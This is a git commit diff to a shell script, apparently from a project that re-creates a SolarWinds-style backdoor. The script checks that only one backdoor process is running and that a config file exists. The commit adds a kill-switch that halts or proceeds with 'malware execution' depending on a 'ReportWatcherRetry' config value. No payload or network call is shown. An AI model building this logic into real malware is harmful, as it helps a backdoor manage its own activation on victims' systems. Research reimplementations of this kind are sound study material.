28bb3db81f1324d85ff7dfde480a9e3f96129c56
Tanguy Boisset <tanguy.boisset@gmail.com>
2022-01-20 11:01:15 +0100

    Check config file for interruption

--- environmentCheck.sh
+++ environmentCheck.sh
@@ -3,7 +3,7 @@
 # Check that only one instance of the backdoor is running
 processName="solarwinds.businesslayerhost";
 procNbr=`ps aux | grep "$processName" | wc -l`;
-if [ "$procNbr" -gt "2" ]; then
+if [[ "$procNbr" -gt "2" ]]; then
   echo "Error : An instance of "$processName" is already running";
   exit 0;
 else
@@ -17,4 +17,14 @@ if [[ -e "$fileName" && -r "$fileName" && -w "$fileName" ]]; then
 else
   echo "Error : No config file "$fileName" found";
   exit 0;
+fi
+
+# Check if the malware must deactivate itself
+configKey="ReportWatcherRetry";
+configLine=`grep "$configKey" "$fileName"`;
+if [[ "$configLine" == *"3"* ]]; then
+  echo "Interrupting malware's network activity...";
+  exit 0;
+else
+  echo "Proceeding with malware execution...";
 fi
